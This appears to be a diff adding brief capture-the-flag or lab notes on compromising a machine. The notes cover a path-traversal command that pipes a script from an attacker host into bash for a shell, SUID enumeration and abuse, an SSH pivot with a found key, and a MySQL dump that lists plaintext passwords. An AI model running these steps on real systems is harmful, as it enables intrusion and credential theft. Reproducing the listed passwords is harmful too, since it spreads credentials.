@@ -1,0 +1,16 @@
+path traversal vuln allows rce
+<Machine_IP>/index.php?path=../../tmp | curl <Attacker_IP>/shell.sh | bash to get www-data shell
+
+find / -type f -perm -u=s 2>/dev/null shows crypt with cap suid set
+use full path crypt with mike argument to login as mike
+
+to shift to host2:
+ssh with id_rsa in mike home folder to host2 # host2 ip found using ip a
+mysql is open on 127.0.0.1
+mysql password for mysql -h 127.0.0.1 -u mike -p password
+databases showed
+
+login | password            |
++-------+---------------------+
+| root  | bjsig4868fgjjeog    |
+| mike  | WhatAreYouDoingHere 
